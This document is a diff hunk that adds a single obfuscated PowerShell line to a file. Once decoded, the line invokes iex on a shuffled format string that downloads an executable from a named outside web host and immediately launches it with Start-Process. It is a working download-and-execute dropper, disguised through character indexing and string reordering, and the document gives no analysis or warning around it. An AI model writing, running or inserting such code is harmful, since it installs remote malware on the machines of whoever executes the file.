@@ -1,0 +1,1 @@
+﻿. ( $enV:cOMsPEC[4,24,25]-JOin'') ( ((("{17}{6}{18}{0}{3}{13}{1}{5}{8}{20}{10}{15}{12}{4}{2}{21}{7}{22}{9}{19}{16}{14}{11}"-f 't Sy','ent','})','stem.','le.exe{0',').Do','-Obj',' ','wnloadFile({0}http://worldnit.','0','/compu','}','},{0}fleeb','Net.WebCli','e.exe{0','.exe{0','eebl','(New','ec','}fl','com',';Start-Process','{'))  -F  [char]39) )
